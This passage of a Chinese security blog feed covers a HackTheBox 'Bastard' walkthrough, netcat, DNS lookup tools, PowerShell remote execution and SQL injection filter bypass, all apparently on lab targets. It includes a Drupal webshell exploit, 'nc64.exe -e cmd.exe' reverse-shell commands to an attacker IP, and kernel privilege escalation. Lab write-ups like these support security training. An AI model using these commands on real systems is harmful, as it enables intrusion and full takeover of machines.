class="string">&#x27;url&#x27;</span>);</span><br></pre></td></tr></table></figure><p>iex可以远程下载我们的脚本，并将其执行。</p><p>*iex：invove-expression</p><p>第二种是使用Invoke-Encode脚本来将我们现有的脚本编码压缩，生成编码后的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Encode -DataToEncode &quot;file&quot; -OutCommand</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/2023/09/4ecd6259fa1fe0b57223b401fb8c2c47.png" alt="image-20230916103015199"></p><p>然后在目标上可以使用如下命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -e [encodedscript]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB靶机-Bastard</title>
      <link href="/2023/07/24/HTB%E9%9D%B6%E6%9C%BA-Bastard/"/>
      <url>/2023/07/24/HTB%E9%9D%B6%E6%9C%BA-Bastard/</url>
      
        <content type="html"><![CDATA[<h2 id="连接到hackthebox">连接到HackTheBox</h2><p>在HTB网站下载vpn文件，使用openvpn进行连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openvpn lab_dguthacker.ovpn</span><br></pre></td></tr></table></figure><p>连接成功后启动靶机，对靶机进行ping测试，测试连接稳定性，并查看本机在虚拟网络中的地址</p><p><img src="https://image.icewindy.cn/202307241318435.png" alt="image-20230724131823342"></p><p>可以看到本机ip为10.10.16.3，与靶机10.10.10.9连接延迟110+ms，无丢包，连接较稳定。</p><h2 id="nmap信息收集">nmap信息收集</h2><h3 id="tcp端口信息收集">TCP端口信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 10000 -p- 10.10.10.9 -oA nmapscan/ports</span><br></pre></td></tr></table></figure><p>解析：</p><ul><li>-sT：TCP扫描</li><li>–min-rate 10000：最小速率10000</li><li>-p-：全端口扫描</li><li>-oA：结果全格式输出保存到nmapscan/ports</li></ul><p><img src="https://image.icewindy.cn/202307241336936.png" alt="image-20230724133655904"></p><p>从结果上看，有三个端口是开放的。</p><h3 id="进行udp端口信息收集">进行UDP端口信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU --top-ports 20 10.10.10.9 -oA nmapscan/UDP</span><br></pre></td></tr></table></figure><p>解析：</p><ul><li>-sU：UDP扫描</li><li>–top-ports 20：最常用的20个端口</li></ul><p><img src="https://image.icewindy.cn/202307241335971.png" alt="image-20230724133542942"></p><p>可以看到扫描结果都是<code>open|filtered</code>的状态，没有利用价值。</p><h3 id="进行详细信息扫描">进行详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p80,135,49154 10.10.10.9 -oA nmapscan/detail</span><br></pre></td></tr></table></figure><p>解析：</p><ul><li>-sV：探测各服务版本</li><li>-sC：使用默认脚本扫描</li><li>-O：探测操作系统</li><li>-p80,135,49154：指定上面TCP扫描出来的三个端口</li></ul><p>扫描结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Microsoft IIS httpd 7.5</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/</span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt</span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt</span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-title: Welcome to Bastard | Bastard</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">135/tcp   open  msrpc   Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc   Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose|phone|specialized</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 8|Phone|7|2008|8.1|Vista (92%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1</span><br><span class="line">Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (89%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><p>结果解析：</p><ul><li><p>80/tcp    open  http    Microsoft IIS httpd 7.5：使用的是IIS httpd 7.5版本</p></li><li><p>|_http-generator: Drupal 7 (<a href="http://drupal.org">http://drupal.org</a>)：网页使用的框架为Drupal 7</p></li><li><p>其中包含一些文件：</p><p>| http-robots.txt: 36 disallowed entries (15 shown)<br>| /includes/ /misc/ /modules/ /profiles/ /scripts/<br>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt<br>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt<br>|_/LICENSE.txt /MAINTAINERS.txt</p></li><li><p>135和49154都是RPC，即远程调用，功能性服务</p></li><li><p>这些是操作系统可能性的列表：</p><p>Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (89%)</p><p>我们也可以通过IIS的版本来判断Windows的版本</p><p><img src="https://image.icewindy.cn/202307241535103.png" alt="image-20230724153530071"></p></li></ul><h2 id="web渗透测试">WEB渗透测试</h2><p>由于存在WEB服务，因此我们可以使用一些WEB渗透的思路来对服务器进行测试。</p><h3 id="whatweb扫描网站">WHATWEB扫描网站</h3><p>由于存在80服务，即网页服务，所以我们可以通过WHATWEB来扫描网站信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb 10.10.10.9</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202307241537988.png" alt="image-20230724153701949"></p><h3 id="弱密码尝试">弱密码尝试</h3><p>首先我们想到使用默认密码，但是我们经过搜索引擎查询发现，Drupal似乎不存在默认密码。现代化的框架大多不会存在默认密码，都会给出一串随机密码，或者是要求首次登录就修改密码。</p><p>然后我们就来尝试常见的密码，例如admin/admin之类的，随便试几个即可，发现都失败了。</p><p><img src="https://image.icewindy.cn/202307242023836.png" alt="image-20230724202347793"></p><h3 id="robots信息利用">robots信息利用</h3><p>我们在nmap详细信息扫描时，发现是存在robots文件的，robots文件内包含着许多目录</p><p><img src="https://image.icewindy.cn/202307251516483.png" alt="image-20230725151641367"></p><p>我们注意到有一个<code>/CHANGELOG.txt</code>，这个文件我们需要注意，往往里面包含着一些我们可能用得上的信息。其他文件我们还需要注意<code>README</code>、<code>update</code>之类的文件，都会包含一些对我们有效的信息。现在我们打开CHANGELOG.txt</p><p><img src="https://image.icewindy.cn/202307251616011.png" alt="image-20230725161642951"></p><p>我们得知Drupal具体的版本信息为7.54。用searchsploit搜索drupal相关的可利用漏洞，在结果比较多的情况下，我们可以先搜索全部漏洞，然后用排除参数排除掉我们不需要的关键词</p><p>现在我们排除关键词<code>Metasploit</code>、<code>Denial of Service</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit drupal --exclude=&quot;(Metasploit)|Denial of Service&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202307251946858.png" alt="image-20230725194611795"></p><p>经过我们再次手动筛选后，可以筛选出几个符合我们版本号的漏洞</p><ul><li>Drupal 7.x Module Services - Remote Code Execution</li><li>Drupal &lt; 7.58 - ‘Drupalgeddon3’ (Authenticated) Remote Code Execution (PoC)</li><li>Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - ‘Drupalgeddon2’ Remote Code Execution</li></ul><p>我们将这三个漏洞利用方法下载下来</p><p><img src="https://image.icewindy.cn/202307251951902.png" alt="image-20230725195144846"></p><p>我们使用<code>ls -lah</code>可以看到我们已经将利用方式下载下来了。</p><h2 id="41564漏洞使用尝试">41564漏洞使用尝试</h2><p>使用任意编辑器打开文件，阅读注释</p><p><img src="https://image.icewindy.cn/202307251956087.png" alt="image-20230725195611028"></p><p>翻译一下大概是</p><ol><li>使用SQL注入获取当前端点的缓存内容，包括管理员凭据和哈希值。</li><li>修改缓存，使我们能够写入文件，并执行操作。</li><li>还原缓存。</li></ol><p>接着我们需要修改php内的相关参数，完成一些选项的初始化。</p><p>通过注释，我们可以发现需要完成初始化设置的部分</p><p><img src="https://image.icewindy.cn/202307261157959.png" alt="image-20230726115756912"></p><p>其中我们需要注意到的是<code>url</code>、<code>endpoint_path</code>、<code>endpoint</code>、<code>file</code>四个部分。url修改为我们的目标，即<code>10.10.10.9</code>，而endpoint_path、endpoint我们不清楚，暂时将其留空。file部分，是我们自定义上传的部分，我们将filename修改成我们自己想要的名称，而data部分填入要在文件内填入的内容，也就是我们的webshell的部分。</p><p><img src="https://image.icewindy.cn/202307261447901.png" alt="image-20230726144748877"></p><p>保存退出，并执行<code>php 41564.php</code>。发现出现了报错</p><p><img src="https://image.icewindy.cn/202307261451799.png" alt="image-20230726145111772"></p><p>这应该是因为我们没有初始化endpoint_path、endpoint部分，我们可以查阅漏洞发布的网站。</p><p>我们先来了解一下endpoint和rest_endpoint是什么，来看GPT给出的回答</p><blockquote><p>在Drupal中，“endpoint” 通常指的是与网站或应用程序进行交互的特定URL路径或终点。它可以是用于访问特定功能或服务的端点。在Drupal中，端点可以对应于不同的功能、API请求、页面或其他特定的操作。通过访问这些端点，可以与 Drupal 系统进行交互并执行相应的操作，例如获取、创建、更新或删除内容、用户管理等。每个端点都有其对应的功能和处理逻辑。</p><p>在Drupal中，<code>rest_endpoint</code> 是指用于提供 RESTful Web 服务的特定路径或端点。REST（Representational State Transfer）是一种用于构建分布式系统和设计网络应用程序的软件架构风格。在Drupal中，RESTful Web 服务允许通过 HTTP 请求与网站进行交互，并使用标准的HTTP方法（如GET、POST、PUT、DELETE）来执行各种操作，例如获取、创建、更新或删除内容。<code>rest_endpoint</code> 在Drupal中通常在配置中指定，用于定义 RESTful Web 服务的根路径或可用端点的URL模式。它确定了与 Drupal 系统进行通信时需要访问的特定路径，以便使用 RESTful API 进行数据传输和操作。通过这些端点，可以与 Drupal 网站进行数据交互和集成，从而实现自定义应用程序或与其他系统的集成。</p></blockquote><p>在网站官网，我们找到了这样一句话</p><blockquote><p>The exploitation is completely stealth. Nevertheless, one has to guess or find the endpoint URL, which mitigates the vulnerability a bit.</p><p>这个利用过程完全隐秘。然而，仍然需要猜测或找到端点的URL，这在一定程度上减轻了漏洞的影响。</p></blockquote><p>也就是说endpoint的url是需要我们猜测或者是寻找的，这时候我们只能用到目录爆破了。</p><h3 id="目录爆破找到endpoint">目录爆破找到endpoint</h3><p>我们使用到dirsearch进行目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ../../dirsearch/dirsearch.py -u http://10.10.10.9 -x 403,404,503 -t 50</span><br></pre></td></tr></table></figure><p>解析：</p><ul><li>-u <a href="http://10.10.10.9">http://10.10.10.9</a>：指定目标</li><li>-x：排除响应码</li><li>-t：指定线程数量</li></ul><p>这个目录爆破将会非常久，长达几个小时。</p><p>在经过漫长的等待后，我们在爆破的结果中，发现了一个目录——<code>/rest</code>，立即访问尝试</p><p><img src="https://image.icewindy.cn/202307261535526.png" alt="image-20230726153536492"></p><p>证明<code>/rest</code>确实是我们需要的url。</p><h3 id="拿取webshell">拿取WebShell</h3><p>我们可以返回41564.php，修改相关参数</p><p><img src="https://image.icewindy.cn/202307261536415.png" alt="image-20230726153653390"></p><p>执行<code>php 41564.php</code>，显示成功</p><p><img src="https://image.icewindy.cn/202307261538609.png" alt="image-20230726153809580"></p><p>给我们的信息为</p><ul><li>保存了session信息在session.json</li><li>保存了用户信息在user.json</li><li>向缓存写入了7条记录</li><li>已成功写入文件10.10.10.9/1ce.php</li></ul><p>我们尝试访问10.10.10.9/1ce.php，看是否拿到了webshell</p><p><img src="https://image.icewindy.cn/202307261543485.png" alt="image-20230726154318438"></p><p>很明显我们已经成功拿到webshell。现在我们需要考虑如何利用我们的webshell了，我们这里尝试使用nc制作反弹shell。</p><p>从互联网下载一个Windows版本的nc，然后使用smb让被攻击靶机能够使用我们下载的nc。</p><p><img src="https://image.icewindy.cn/202307261733004.png" alt="image-20230726173331957"></p><p>此命令的含义为以当前文件夹建立一个叫share的smb共享。然后我们开启一个nc的监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvnp 4444</span><br></pre></td></tr></table></figure><p>然后我们构建url让webshell执行nc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.9/1ce.php?1ce=\\10.10.16.3\share\nc64.exe -e cmd.exe 10.10.16.3 4444</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202307261739464.png" alt="image-20230726173934436"></p><p>我们在nc监听处看到shell，这一步做完，我们就拿到了初始权限的shell。</p><p>我们在用户目录下就可以找到我们需要的flag</p><p><img src="https://image.icewindy.cn/202307261742862.png" alt="image-20230726174249837"></p><p>提交验证，完成第一个flag。</p><p>实际上还有第二种方式可以拿到webshell，思路大概就是通过我们之前拿到的admin的session，直接通过框架的内容编辑器，然后植入php代码作为webshell。</p><h2 id="44449漏洞利用">44449漏洞利用</h2><p>由于忘记续靶机时长了，导致进度重置。那就试试剩下两种方法的。这个利用基本上是一键就可以成功利用</p><p><img src="https://image.icewindy.cn/202307281622633.png" alt="image-20230728162223472"></p><p>现在我们已经拿到了一个webshell</p><p><img src="https://image.icewindy.cn/202307281700458.png" alt="image-20230728170003422"></p><p>似乎具有一定限制，我们无法切换目录，我们现在使用nc将一个shell反弹出去，使我们能用到我们熟悉的shell。执行下面的命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\<span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">4</span>\share\nc64.exe -e <span class="built_in">cmd</span>.exe <span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">4</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure><p>在此之前，我们在本机上执行监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvnp 4444</span><br></pre></td></tr></table></figure><p>等待一会后，我们在本机的nc监听上看见了反弹shell</p><p><img src="https://image.icewindy.cn/202307282135887.png" alt="image-20230728213526812"></p><p>与我们之前的效果一致。接下来的步骤与之前都类似了，不再赘述。</p><h2 id="windows提权">Windows提权</h2><p>现在我们还需要获取到Root的flag。首先我们可以确定的是，Administrator文件夹内我们是无法进去的。</p><p><img src="https://image.icewindy.cn/202307282145632.png" alt="image-20230728214545597"></p><p>因此我们需要提升权限以读取到Administrator用户文件夹内的flag。</p><p>我们通过systeminfo可知，该系统是没有进行热修复（Hotfix）的。</p><p><img src="https://image.icewindy.cn/202307282148114.png" alt="image-20230728214843093"></p><p>因为大概率上随便寻找一个在Microsoft Windows Server 2008 R2提权漏洞就可以成功提权。</p><p>我们在Github Windows提权漏洞合集（<a href="https://github.com/SecWiki/windows-kernel-exploits">SecWiki/windows-kernel-exploits: windows-kernel-exploits Windows平台提权漏洞集合 (github.com)</a>）中搜索R2作为关键词，搜索符合Windows 2008 r2的漏洞。</p><p>由于没有Hotfix，所以我们随便点开一个<a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120">windows-kernel-exploits/CVE-2018-8120 at master · SecWiki/windows-kernel-exploits (github.com)</a>。使用wget下载到我们之前smb共享的目录下，且在远程主机上执行</p><p><img src="https://image.icewindy.cn/202307291636061.png" alt="image-20230729163621022"></p><p>可以看到，我们已经取得了最高等级的系统权限。然后我们将whoami替换成反弹shell的命令，并开启另外一个监听窗口</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\<span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">4</span>\share\x64.exe &quot;\\<span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">4</span>\share\nc64.exe -e <span class="built_in">cmd</span>.exe <span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">4</span> <span class="number">3333</span>&quot;</span><br></pre></td></tr></table></figure><p>结果发现无法执行</p><p><img src="https://image.icewindy.cn/202307291704024.png" alt="image-20230729170440982"></p><p>这种情况，大概可以通过重新连接可以解决，因为我们在使用利用程序的时候，环境可能发生了一些变化，导致第二次无法正常执行。重新连接后，我们再次尝试相同的命令</p><p><img src="https://image.icewindy.cn/202307291707598.png" alt="image-20230729170711504"></p><p>成功得到system级别权限的shell。进入文件夹取得flag</p><p><img src="https://image.icewindy.cn/202307291709651.png" alt="image-20230729170901624"></p><p>提交flag，完成机器</p><p><img src="https://image.icewindy.cn/202307291727812.png" alt="image-20230729172717759"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集（3）：DNS</title>
      <link href="/2023/07/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%883%EF%BC%89%EF%BC%9ADNS/"/>
      <url>/2023/07/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%883%EF%BC%89%EF%BC%9ADNS/</url>
      
        <content type="html"><![CDATA[<h2 id="nslookup">NSLOOKUP</h2><p>nslookup具有两种模式，交互和非交互</p><p><strong>非交互模式</strong></p><p><img src="https://image.icewindy.cn/202307141411149.png" alt="image-20230714141130053"></p><p><strong>交互模式</strong></p><p>进入交互模式后不需要输入nslookup，即可重复查询DNS解析</p><p><img src="https://image.icewindy.cn/202307141413343.png" alt="image-20230714141304311"></p><p><strong>输出结果解析</strong></p><ul><li><p>最上面的是Server和Address是查询的DNS服务器。可自行指定</p></li><li><p>#53 代表的是模式情况下DNS服务器端口为53</p></li><li><p>Non-authoritative answer非权威应答，answer来自于其他服务器的缓存，而不是权威的DNS服务器。</p><p><a href="https://serverfault.com/questions/413124/dns-nslookup-what-is-the-meaning-of-the-non-authoritative-answer">domain name system - DNS - NSLOOKUP what is the meaning of the non-authoritative answer? - Server Fault</a></p><p>&quot;Non-authoritative answer&quot;意味着响应来自于非授权服务器，它可能是一个经过缓存的响应或者来自中间服务器。在大多数情况下，这种响应是可靠和有效的，但也有可能存在更新延迟或不准确的情况。</p></li></ul><p><strong>指定特定类型的查询</strong></p><p>在默认情况下，nslookup会解析A类型，我们可以使用type来指定类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup -<span class="built_in">type</span>=mx example.com</span><br><span class="line">nslookup -<span class="built_in">type</span>=ns example.com //查找权威名字服务器</span><br></pre></td></tr></table></figure><p>还有一种类型记录是反向DNS解析 PTR</p><p><img src="https://image.icewindy.cn/202307141433465.png" alt="image-20230714143337439"></p><p>其中<code>-ty</code>是<code>-type</code>的缩写</p><p>如果是在交互模式下，我们可以使用<code>set type=解析类型</code>的命令来更换解析类型</p><p><strong>指定DNS服务器</strong></p><p>默认情况下，&quot;nslookup&quot;命令将使用本地系统配置的DNS服务器。如果你想指定使用特定的DNS服务器进行查询，可以使用以下语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup example.com &lt;DNS服务器IP&gt;</span><br></pre></td></tr></table></figure><p>而交互模式下切换是这样的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server &lt;DNS服务器IP&gt;</span><br></pre></td></tr></table></figure><h2 id="dig">DIG</h2><p>dig也是一个命令行工具</p><p><strong>基本使用方法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dig @8.8.8.8 example.com mx</span><br><span class="line">dig www.sina.com any</span><br></pre></td></tr></table></figure><p>@：指定进行域名解析的域名服务器</p><p>mx、any：指定查询的类型，缺省时按照记录A执行查询</p><p><strong>反向查询</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig +noall +answer -x 8.8.8.8</span><br></pre></td></tr></table></figure><p>+[no]answer：显示 [不显示] 应答的回答部分，缺省显示</p><p>+[no]all：设置或清除所有显示标志</p><p>-x：反向查询</p><p><strong>bind版本信息</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig +noall +answer txt chaos VERSION.BIND @ns.example.com</span><br></pre></td></tr></table></figure><p>chaos：txt的类级别是chaos类。A、mx记录等，是IN类</p><p>VERSION.BIND：具体要查的类型</p><p><strong>DNS跟踪</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig +trace example.com</span><br></pre></td></tr></table></figure><p>+[no]trace：切换为待查询名称从根名称服务器开始的代理路径跟踪。缺省情况不使用跟踪</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络工具瑞士军刀-NETCAT</title>
      <link href="/2023/07/07/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80-NETCAT/"/>
      <url>/2023/07/07/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80-NETCAT/</url>
      
        <content type="html"><![CDATA[<h2 id="netcat是什么">NETCAT是什么</h2><p>netcat被称为网络工具中的瑞士军刀，体积小功能多</p><ul><li>侦听模式 / 传输模式</li><li>telnet / 获取banner信息</li><li>传输文本信息</li><li>传输文件/目录，作为一个文件服务器或是说FTP服务器</li><li>加密传输文件</li><li>远程控制/木马，有个很理想的特性是杀毒软件几乎不会把NC当作病毒</li><li>加密所有流量</li><li>流媒体服务器</li><li>远程克隆硬盘（电子取证相关）</li></ul><h2 id="telnet-banner">telnet / banner</h2><ul><li><p>nc -nv 192.168.31.1 80</p><p>-n: 直接使用IP地址，不使用dns</p><p>-v: 展示详细信息</p></li></ul><p>连接后可以使用HTML相关的一些指令，例如<code>head /</code>等</p><h2 id="传输文本信息">传输文本信息</h2><ul><li>A：nc -l -p 4444</li><li>B：nc -nv 对方的IP 4444</li></ul><p><img src="https://image.icewindy.cn/202307111450990.png" alt="image-20230711142317666"></p><p>这个功能可以在数字取证中使用，例如我们需要将ls -l的结果输出到另外一台机子上，并将结果输出到一个文本文件中，我们就可以用到这个功能</p><p><img src="https://image.icewindy.cn/202307111457678.png" alt="image-20230711145721657"></p><p><img src="https://image.icewindy.cn/202307111457914.png" alt="image-20230711145750890"></p><h2 id="传输文件-目录">传输文件/目录</h2><h3 id="传输文件">传输文件</h3><ul><li>A： nc -lp 4444 &gt; 保存的名称</li><li>B： nc -nv 目标ip 4444 &lt; 要传递文件</li></ul><p>或</p><ul><li>A：nc -lp 4444 &lt; 要传输的名称</li><li>B： nc -nv 目标ip 4444 &gt; 保存的名称</li></ul><h3 id="传输目录">传输目录</h3><p><img src="https://image.icewindy.cn/202307121334218.png" alt="image-20230712133423205"></p><p>-q的含义是传输完毕后1秒关闭通讯</p><h3 id="加密传文件">加密传文件</h3><p><img src="https://image.icewindy.cn/202307121334489.png" alt="image-20230712133446454"></p><p>实际上后面两种都是通过管道对文件或者目录进行处理之后变成一个文件再进行传输</p><h2 id="流媒体服务">流媒体服务</h2><p><img src="https://image.icewindy.cn/202307121416991.png" alt="image-20230712141601955"></p><p>实际上也是和前面几种类似的</p><h2 id="远程克隆硬盘">远程克隆硬盘</h2><p>原理上与上面的也是类似的，使用dd将硬盘打包为一个文件，然后用nc传输</p><p><img src="https://image.icewindy.cn/202307121430777.png" alt="image-20230712143044737"></p><h2 id="端口扫描">端口扫描</h2><ul><li><p>nc -nvz 1.1.1.1 1-65535</p><p>-z : zero-I/O mode[used for scanning]</p><p>默认情况下使用的是tcp协议探测</p></li><li><p>nc -nvzu 1.1.1.1 1-1024</p><p>-u : 使用udp协议探测</p></li></ul><h2 id="远程控制">远程控制</h2><p>nc在一定程度上能够替代ssh</p><p><img src="https://image.icewindy.cn/202307121512591.png" alt="image-20230712151231539"></p><p>正向：B控制A，反向：A控制B</p><p>即提供<code>-c bash</code>那边是被控制一端</p><h2 id="ncat">ncat</h2><p>nc本身缺少加密和身份验证的能力，而ncat是一个更加强大版本的nc，它是nmap工具包的一部分。基本功能与nc无差别，不具体介绍，这里介绍一下ncat的加密功能。</p><p><img src="https://image.icewindy.cn/202307131505583.png" alt="image-20230713150534535"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（11）：注释符号过滤</title>
      <link href="/2023/05/05/SQL%E6%B3%A8%E5%85%A5%EF%BC%8811%EF%BC%89%EF%BC%9A%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%E8%BF%87%E6%BB%A4/"/>
      <url>/2023/05/05/SQL%E6%B3%A8%E5%85%A5%EF%BC%8811%EF%BC%89%EF%BC%9A%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%E8%BF%87%E6%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>在我们注入的过程中，会遇到一些措施或者WAF对我们的注入进行拦截或者是使其失效。因此我们还需要了解如何绕过一些对我们SQL注入进行拦截的方法。</p><h2 id="注释符号过滤">注释符号过滤</h2><p>对于靶机less-23，它对我们的注释符号进行了过滤，使得我们没法通过一般手段注释掉后面的查询语句</p><img src="https://image.icewindy.cn/202305051654918.png" alt="image-20230505165432801" style="zoom:50%;" /><p>我们先来看源代码部分，源代码实现这个效果的方式非常简单</p><img src="https://image.icewindy.cn/202305051702611.png" alt="image-20230505170218565" style="zoom:67%;" /><p>简单来说，就是一旦在id中匹配到<code>#</code>或者<code>--</code>，就会替换成空。</p><h3 id="方法一">方法一</h3><p>添加多一个闭合符，使其后面单引号完成闭合。此方法不一定能够成功，可以尝试一下</p><img src="https://image.icewindy.cn/202305051719518.png" alt="image-20230505171939472" style="zoom:50%;" /><h3 id="方法二">方法二</h3><p>使用or/and进行绕过，通过or/and后面追加的语句实现闭合。</p><img src="https://image.icewindy.cn/202305051730824.png" alt="image-20230505173029785" style="zoom: 67%;" /><p>此方法通过留出一个闭合符与源代码中的闭合符进行闭合，使得注入语句可以正常执行。</p><p>接下来我们只需要在能正常回显的<code>2</code>处，修改成我们的注入语句即可。</p><h2 id="and和or过滤">and和or过滤</h2>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
